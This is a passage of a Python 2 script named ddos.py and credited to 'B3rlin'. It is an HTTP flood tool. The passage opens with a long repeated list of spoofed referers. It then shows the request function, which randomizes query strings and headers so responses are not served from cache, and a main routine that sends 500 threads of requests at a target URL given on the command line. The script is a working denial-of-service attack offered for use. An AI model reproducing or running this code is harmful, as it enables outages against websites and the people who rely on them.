    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.facebook.com/en/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('https://www.nasa.gov/topics/search?q=')
    headers_referers.append('http://' + host + '/')
    return (headers_referers)

# builds random ascii string


def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return (out_str)


def usage():
    print '---------------------------------------------------'
    print 'python ddos.py site-url'
    print 'B3rlin'
    print '---------------------------------------------------'


# http request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib2.Request(url + param_joiner + buildblock(
        random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(
        headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    try:
        urllib2.urlopen(request)
    except urllib2.HTTPError, e:
        # print e.code
        set_flag(1)
        print 'PACKETS SENDING!'
        code = 500
    except urllib2.URLError, e:
        # print e.reason
        sys.exit()
    else:
        inc_counter()
        urllib2.urlopen(request)
    return (code)


# http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) & (safe == 1):
                    set_flag(2)
        except Exception, ex:
            pass

# monitors http threads and counts requests


class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous+100 < request_counter) & (previous <> request_counter):
                print "%d Requests Sent" % (request_counter)
                previous = request_counter
        if flag == 2:
            print "\n-- 
TOO MUCH DDOSED TODAY '-' --"


# execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print "----|| NEVER MESS ||----"
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('(https?\://)?([^/]*)/?.*', url)
        host = m.group(2)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
